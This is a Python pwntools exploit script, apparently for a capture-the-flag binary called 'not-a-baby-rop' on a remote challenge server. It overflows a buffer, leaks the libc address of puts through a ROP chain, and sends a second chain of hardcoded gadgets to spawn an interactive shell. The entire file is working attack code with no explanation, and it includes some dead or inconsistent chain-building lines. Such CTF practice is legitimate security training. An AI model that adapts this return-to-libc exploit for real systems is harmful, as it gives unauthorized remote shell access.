#!/usr/bin/python3
from pwn import *
from pprint import pprint

context.log_level = 'DEBUG'
context.arch = 'amd64'

offset = 136

elf = ELF("./not-a-baby-rop")

#p = elf.process()
p = remote("warzone.hackrocks.com", 7770)

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

print(p.recvuntil("\n"))

payload = [
                b"A"*offset,
                rop.chain()
]

payload = b"".join(payload)

p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))
log.info(f"puts found at {hex(puts)}")

libc = ELF("./libc.so.6")
libc.address = puts - libc.symbols["puts"]

log.info(f"libc base address {hex(libc.address)}")

rop = ROP(libc)
rop.call("printf", [ next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

rop.call(elf.symbols['puts'], [ next(libc.search(b"/bin/sh\x00")) ])
rop.call(elf.symbols['main'])


# print(rop.dump())

payload = [
    b"A"*offset,
    p64(libc.address + 0x0000000003a637),
    p64(0x0), #rax
    p64(libc.address + 0x00000000106749),
    p64(0x1337), #rdx
    p64(next(libc.search(b"/bin/sh\x00"))),    #rsi
    p64(0x0000000040122b),
    p64(0x1), #rdi
    p64(libc.address + 0x00000000024104)
]

payload = b"".join(payload)

p.sendline(payload)
p.interactive()